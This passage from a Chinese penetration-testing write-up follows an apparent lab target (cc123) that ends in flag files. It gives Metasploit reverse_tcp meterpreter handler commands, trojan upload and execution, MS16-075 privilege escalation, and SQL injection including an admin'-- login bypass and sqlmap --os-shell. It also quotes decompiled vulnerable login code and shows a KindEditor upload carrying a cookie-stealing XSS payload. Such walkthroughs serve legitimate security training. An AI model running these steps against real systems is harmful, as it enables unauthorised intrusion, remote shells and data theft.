+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2019.15.16.png" alt="截屏2022-05-26 19.15.16"></p>
+<p>与此同时在本地监听7777端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set lhost 192.168.0.114</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set lport 7777</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; exploit -j</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2019.12.34.png" alt="截屏2022-05-26 19.12.34"></p>
+<p>尝试上传木马文件，但是无法执行。因此需要上传一个检测检查目录的执行权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2003.49.02.png" alt="截屏2022-05-26 03.49.02"></p>
+<p>成功找到可用目录为<code>c:\windows\debug\WIA</code>，在该目录下上传木马并执行<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2003.51.38.png" alt="截屏2022-05-26 03.51.38"></p>
+<p>成功收到 meterpreter<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2019.51.39.png" alt="截屏2022-05-26 19.51.39"></p>
+<p>使用<code>local_exploit_suggester</code>模块寻找可用的提权漏洞，但是这里直接报错</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf &gt; set session 1</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2021.46.15.png" alt="截屏2022-05-26 21.46.15"></p>
+<p>选择使用 MS16-075 进行提权，成功拿到 SYSTEM 权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class="line">msf &gt; set session 1</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2021.48.36.png" alt="截屏2022-05-26 21.48.36"></p>
+<p>进入 shell 成功在站点目录中找到第一个flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd C:\HwsHostMaster\wwwroot\ww2cc123_55m39g\web\upimg</span><br><span class="line">dir </span><br><span class="line">type flag.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2022.21.28.png" alt="截屏2022-05-26 22.21.28"></p>
+<p>在管理员目录中找到第二个flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Users\Administrator</span><br><span class="line">dir</span><br><span class="line">type flag2.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2022.22.46.png" alt="截屏2022-05-26 22.22.46"></p>
+<h2 id="0X04-ww2子域渗透"><a href="#0X04-ww2子域渗透" class="headerlink" title="0X04 ww2子域渗透"></a>0X04 ww2子域渗透</h2><h3 id="GrCMS后台SQL注入"><a href="#GrCMS后台SQL注入" class="headerlink" title="GrCMS后台SQL注入"></a>GrCMS后台SQL注入</h3><p>使用 gobuster 扫描目标站点</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://ww2.cc123.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &quot;asp,html&quot; -o ww2_cc123_com.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-28%20%E4%B8%8B%E5%8D%8810.46.01.png" alt="截屏2022-05-28 下午10.46.01"></p>
+<p>成功发现后台目录<code>/admin</code>以及<code>/editor</code>，访问<code>admin</code>后界面为 GrCMS<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2004.18.54.png" alt="截屏2022-05-26 04.18.54"></p>
+<p>使用 BurpSuite 截取数据包，重放后数据包仍然有用说明验证码可以复用，尝试爆破管理员 admin 的密码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-27%2003.59.50.png" alt="截屏2022-05-27 03.59.50"></p>
+<p>成功拿到密码为 cc123，与此同时我们对用户名进行爆破时发现目标存在万能密码漏洞<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-27%2004.01.39.png" alt="截屏2022-05-27 04.01.39"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/Login.aspx HTTP/1.1</span><br><span class="line">Host: ww2.cc123.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 499</span><br><span class="line">Origin: http://ww2.cc123.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://ww2.cc123.com/admin/Login.aspx</span><br><span class="line">Cookie: _ga_7VBGV5VRLB=GS1.1.1653417876.1.1.1653417947.0; _ga=GA1.2.961710506.1653417877; _ga_6NMMDGGQXS=GS1.1.1653417876.1.1.1653417947.0; CheckCode=4JP4; ASP.NET_SessionId=nqhoxe5j1pxeop0macvxdqgn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">__VIEWSTATE=%2FwEPDwUJMzMyMjA3OTM4ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUMSW1hZ2VCdXR0b24xqZOLn0fzcRfu7EbEDKHoyvx3obU94MS6VAUneBJOkZ0%3D&amp;__VIEWSTATEGENERATOR=82312306&amp;__EVENTVALIDATION=%2FwEdAAc5ZYESCKH66fJHGLAe4TLCKhoCyVdJtLIis5AgYZ%2FRYe4sciJO3Hoc68xTFtZGQEgOC%2FFhCJvlJJDlu9nTwjvq6ZACrx5RZnllKSerU%2BIuKh2nXP6dhZn6mKtmTGNHd3MtizSQ3FDPz4jhBkvaNoE1AM2SGgwYOgU2pIFlxhELWg1KHCIX5swqFeVF8xxNL%2Fg%3D&amp;username=admin*&amp;password=123456&amp;safecode=4JP4&amp;ImageButton1.x=30&amp;ImageButton1.y=4&amp;TextBox2=</span><br></pre></td></tr></table></figure>
+
+<p>由于存在万能密码漏洞，该漏洞的本质是 SQL 注入，因此可以使用 sqlmap 进行注入</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt --banner --current-user</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-27%2004.19.03.png" alt="截屏2022-05-27 04.19.03"><br>成功扫描到SQL注入漏洞并拿到如下信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、数据库为MSSQL</span><br><span class="line">2、当前用户为数据库管理员sa</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-30%2023.16.46.png" alt="截屏2022-05-30 23.16.46"><br>列出库名信息，列出表名、列名也是类似操作</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt --dbs --dbms mssql</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-30%2023.28.07.png" alt="截屏2022-05-30 23.28.07"></p>
+<p>由于当前用户为sa，开启 xp_cmdshell 后能够执行命令，通过 sqlmap 中的<code>--os-shell</code>可直接可自动化执行操作，查看权限发现当前用户为系统权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt --os-shell</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-30%2023.50.04.png" alt="截屏2022-05-30 23.50.04"><br>查看IP地址发现为10.10.10.131，说明目标站点站库分离，我们已经拿到内网主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2000.45.24.png" alt="截屏2022-05-31 00.45.24"></p>
+<h3 id="GrCMS-NET代码审计"><a href="#GrCMS-NET代码审计" class="headerlink" title="GrCMS.NET代码审计"></a>GrCMS.NET代码审计</h3><p>通过 SYSTEM 权限进入主机 www2cc123 目录当中</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\HwsHostMaster\wwwroot\ww2cc123_55m39\web</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2002.51.38.png" alt="截屏2022-05-31 02.51.38"></p>
+<p>其中都是 aspx 文件，但是我们访问站点并没有发现 asp 文件，说明站点可能使用了伪静态<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2003.01.58.png" alt="截屏2022-05-31 03.01.58"></p>
+<p>查看配置文件<code>web.config</code>，结果确实存在伪静态规则</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type web.config</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2003.05.07.png" alt="截屏2022-05-31 03.05.07"></p>
+<p>而 aspx 文件并没有实质内容，配置代码全部都在<code>bin</code>目录当中，将该目录下载下来</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd c:/</span><br><span class="line">cd HwsHostMaster/wwwroot/ww2cc123_55m39/web/</span><br><span class="line">download bin</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2003.28.23.png" alt="截屏2022-05-31 03.28.23"></p>
+<p>使用 <a target="_blank" rel="noopener" href="https://github.com/icsharpcode/ILSpy">ILSPY</a> 进行反编译，导入对应的 dll 文件即可获取到对应代码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2003.34.56.png" alt="截屏2022-05-31 03.34.56"></p>
+<p>反编译<code>App_Web_login.aspx</code>dll 文件后的代码如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-01%2002.57.05.png" alt="截屏2022-06-01 02.57.05"></p>
+<h4 id="验证码重用"><a href="#验证码重用" class="headerlink" title="验证码重用"></a>验证码重用</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">ImageButton1_Click</span><span class="params">(object sender, ImageClickEventArgs e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (base.Request.Cookies[<span class="string">&quot;CheckCode&quot;</span>].Value == safecode.Text.Trim().ToUpper())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">string</span> sql = <span class="string">&quot;select * from admin where username=&#x27;&quot;</span> + username.Text.Trim() + <span class="string">&quot;&#x27; and password=&#x27;&quot;</span> + StringClass.Encrypt(password.Text.Trim(), <span class="string">&quot;yx139222&quot;</span>) + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		DataSet tableData = DBClass.GetTableData(sql, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (tableData != null &amp;&amp; tableData.Tables[<span class="string">&quot;admin&quot;</span>].Rows.Count &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			Session[<span class="string">&quot;users&quot;</span>] = username.Text.Trim();</span><br><span class="line">			base.Response.Redirect(<span class="string">&quot;index.aspx&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			base.Response.Write(<span class="string">&quot;&lt;script&gt;alert(&#x27;姓名或密码输入错误！&#x27;);javascript:history.back(-1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		base.Response.Write(<span class="string">&quot;&lt;script&gt;alert(&#x27;验证码输入错误！&#x27;);javascript:history.back(-1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在 ImageButton1_Click 函数中发现验证码验证机制，假设我们通过重用验证码进行爆破，登录失败只会直接提示姓名或密码输入错误，而没有刷新验证码操作，这导致了验证码重用漏洞的产生</p>
+<h4 id="后台SQL注入"><a href="#后台SQL注入" class="headerlink" title="后台SQL注入"></a>后台SQL注入</h4><p>与此同时以上代码还将用户名和密码直接传递给 SQL 语句，但是代码中并未对输入进行过滤，导致我们可以进行 SQL 注入，比如将用户设置为<code>admin&#39;--</code>，对应的 SQL 语句如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where username=&#x27;admin&#x27;--&#x27; and password=&#x27;xxx&#x27;;</span><br></pre></td></tr></table></figure>
+<p>以上 SQL 语句的结果为真，那么利用<code>admin&#39;--</code>也就说明我们能够直接登录目标后台，也就是说存在万能密码漏洞。经实践后可成功绕过登录管理后台<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-31%2003.02.38.png" alt="截屏2022-05-31 03.02.38"></p>
+<p>进一步对其他 ASP.Net 代码反编译后台文件，同样未对 SQL 参数输入进行过滤，这说明可能全局存在 SQL 注入漏洞<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-02%2003.19.43.png" alt="截屏2022-06-02 03.19.43"></p>
+<h4 id="后台编辑器文件上传"><a href="#后台编辑器文件上传" class="headerlink" title="后台编辑器文件上传"></a>后台编辑器文件上传</h4><p>查看目标源码资源，成功发现编辑器的名字为 KindEditor，这个编辑器存在文件上传以及XSS漏洞<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-02%2003.25.26.png" alt="截屏2022-06-02 03.25.26"></p>
+<p>首先在后台中点击文件上传，文件源码如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>通过 Burp 抓取数据包，将参数 dir 中的值有 image 转换为 file<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-02%2003.45.49.png" alt="截屏2022-06-02 03.45.49"></p>
+<p>成功上传，访问该地址成功弹出 cookie 信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-02%2003.46.38.png" alt="截屏2022-06-02 03.46.38"></p>
+<h4 id="前台XSS"><a href="#前台XSS" class="headerlink" title="前台XSS"></a>前台XSS</h4><p>在前台所有文件都是正常的 aspx 脚本，成功拿到如下源码信息</p>
